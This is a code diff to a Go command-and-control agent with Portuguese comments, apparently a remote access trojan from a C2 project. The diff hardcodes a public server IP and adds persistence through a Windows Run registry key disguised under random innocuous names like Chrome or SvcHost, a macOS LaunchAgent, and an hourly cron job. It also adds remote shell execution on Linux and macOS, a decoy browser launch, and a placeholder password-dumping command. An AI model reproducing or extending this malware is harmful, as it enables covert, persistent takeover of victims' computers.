@@ -4,12 +4,19 @@ import (
 	commons "NetBios/C2/d3c/commons/estruturas"
 	"NetBios/C2/d3c/commons/helpers"
 	"encoding/gob"
+	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
+	"os/user"
+	"path/filepath"
 	"runtime"
+	"strings"
+	"syscall"
 	"time"
 )
 
@@ -24,8 +31,36 @@ var (
 const (
 	//Coloque aqui o IP publico para conexão
 	SERVIDOR = "200.98.129.32"
-	PORTA    = "9090"
+	//SERVIDOR = "127.0.0.1"
+	PORTA = "9090"
+	url   = "https://www.google.com"
 )
+
+func Bypass() {
+	_, err := http.Get(url)
+	if err != nil {
+		fmt.Println("Erro ao fazer a solicitação HTTP:", err)
+		return
+	}
+
+	// Abre a página do Google no navegador padrão
+	err = exec.Command("xdg-open", url).Start()
+	if err != nil {
+		fmt.Println("Erro ao abrir a página no navegador:", err)
+		return
+	}
+}
+func CapturaUser() {
+	currentUser, err := user.Current()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// Obtém o nome de usuário
+	username := currentUser.Username
+
+	log.Println("Usuário atual:", username)
+}
 
 // Popula as Mensagens com os dados correto
 func init() {
@@ -34,8 +69,115 @@ func init() {
 	mensagem.AgentID = geraID()
 }
 
+func addRegistryKey() error {
+	currentUser, err := user.Current()
+	if err != nil {
+		return err
+	}
+
+	// Obtendo apenas o nome do usuário do caminho completo (caso seja DOMAIN\Username)
+	split := strings.Split(currentUser.Username, "\\")
+	if len(split) > 1 {
+		currentUser.Username = split[1]
+	}
+	words := []string{"Discord", "Adobe", "Python", "PhotoShop", "Slack", "Notion", "Spotfy", "Chrome", "FireFox", "Web", "Internet", "SvcHost", "Windows"}
+	rand.Seed(time.Now().UnixNano())
+	randomIndex := rand.Intn(len(words))
+	command := fmt.Sprintf(`REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "%s" /t REG_SZ /F /D "C:\Users\%s\Downloads\agente.exe"`, words[randomIndex], currentUser.Username)
+	cmd := exec.Command("cmd", "/C", command)
+
+	if runtime.GOOS == "windows" {
+		cmd.SysProcAttr = &syscall.SysProcAttr{}
+	}
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("Erro ao executar o comando: %v\n%s", err, string(output))
+	}
+
+	fmt.Println("Chave do registro adicionada com sucesso!")
+	return nil
+}
+func createLaunchdPlist() error {
+	// Obter o diretório "Downloads" do usuário atual
+	downloadsDir, err := os.UserHomeDir()
+	if err != nil {
+		return err
+	}
+	downloadsDir = filepath.Join(downloadsDir, "Downloads")
+
+	// Caminho completo do arquivo executável "agente"
+	executable := filepath.Join(downloadsDir, "agente")
+
+	// Obtém o diretório LaunchAgents do usuário atual
+	currentUser, err := user.Current()
+	if err != nil {
+		return err
+	}
+	launchAgentsDir := filepath.Join(currentUser.HomeDir, "Library", "LaunchAgents")
+
+	// Cria o arquivo plist
+	plistContent := `<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+	<plist version="1.0">
+	<dict>
+		<key>Label</key>
+		<string>meu.programa</string>
+		<key>ProgramArguments</key>
+		<array>
+			<string>` + executable + `</string>
+		</array>
+		<key>RunAtLoad</key>
+		<true/>
+	</dict>
+	</plist>`
+
+	// Escreve o conteúdo do plist no arquivo
+	err = ioutil.WriteFile(filepath.Join(launchAgentsDir, "meu.programa.plist"), []byte(plistContent), 0644)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+func createCronJob() error {
+	// Obtém o diretório do usuário atual
+	currentUser, err := user.Current()
+	if err != nil {
+		return err
+	}
+	// Caminho para o arquivo executável que será agendado
+	executable := filepath.Join(currentUser.HomeDir, "Downloads", "agente")
+
+	// Cria a linha de comando para adicionar a regra no cron
+	cronJob := fmt.Sprintf("@hourly %s", executable)
+
+	// Caminho completo para o arquivo de cron do usuário atual
+	cronFilePath := filepath.Join(currentUser.HomeDir, ".cron")
+
+	// Abre o arquivo de cron existente ou cria um novo
+	cronFile, err := os.OpenFile(cronFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		return err
+	}
+	defer cronFile.Close()
+
+	// Escreve a nova regra de cron no arquivo
+	_, err = fmt.Fprintln(cronFile, cronJob)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
 func main() {
+	Bypass()
+	addRegistryKey()
+	createLaunchdPlist()
+	createCronJob()
 	log.Println("Executando Agent")
+	CapturaUser()
 	for {
 		canal := conectaServidor()
 		//Enviando a mensagem
@@ -64,7 +206,6 @@ func executaComando(comando string, indice int) (resposta string) {
 		resposta = listaArquivos()
 	case "pwd":
 		resposta = listaDiretorioAtual()
-
 	case "cd":
 		if len(comandoSeparado[1]) > 0 {
 			resposta = mudarDiretorio(comandoSeparado[1])
@@ -73,11 +214,20 @@ func executaComando(comando string, indice int) (resposta string) {
 		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
 	case "get":
 		resposta = enviarArquivoEmDisco(mensagem.Comandos[indice].Comando, indice)
+	case "passwd":
+		resposta = crackPaswd()
 	default:
 		resposta = executaComandoEmShell(comando)
 	}
 	return resposta
 }
+
+// TODO - Fazer modulo de Quebra de Senhas
+func crackPaswd() string {
+	texto := "Dumping Passwords ... Wait .."
+	return texto
+}
+
 func enviarArquivoEmDisco(comandoGet string, indice int) (resposta string) {
 	var err error
 	resposta = "File uploaded successfully"
@@ -103,12 +253,16 @@ func executaComandoEmShell(comandoCompleto string) (resposta string) {
 	if runtime.GOOS == "windows" {
 		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
 		resposta = string(output)
+	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
+		output, _ := exec.Command("sh", "-c", comandoCompleto).CombinedOutput()
+		resposta = string(output)
 	} else {
-		resposta = "Target Op System not implemented"
+		resposta = "Target operating system not implemented"
 	}
 
 	return resposta
 }
+
 func mudarDiretorio(novoDiretorio string) (resposta string) {
 	resposta = "Changed Directory"
 	err := os.Chdir(novoDiretorio)
